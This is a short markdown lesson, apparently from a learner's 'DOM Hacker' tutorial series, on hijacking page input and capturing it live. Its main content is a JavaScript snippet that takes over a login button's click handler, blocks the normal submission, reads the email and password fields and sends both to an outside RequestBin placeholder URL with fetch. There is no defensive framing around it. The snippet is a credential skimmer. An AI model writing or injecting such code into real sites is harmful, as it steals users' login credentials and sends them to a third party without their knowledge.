# DOM Hacker Class 02 - Input Hijacking & Live Data Capture

## Lessoons learnt
- How to grab user input in real-time using DOM
- How to listen for `onclick` or `onsubmit` events
- Sending data to your own server (RequestBin)

---

## ✅ Real-Time Input Capture Script
```js
document.getElementById("loginBtn").onclick = function(event) {
  event.preventDefault();

  let email = document.getElementById("email").value;
  let pass = document.getElementById("password").value;

  fetch("https://YOUR-REQUESTBIN.x.pipedream.net?email=" + email + "&pass=" + pass);
};
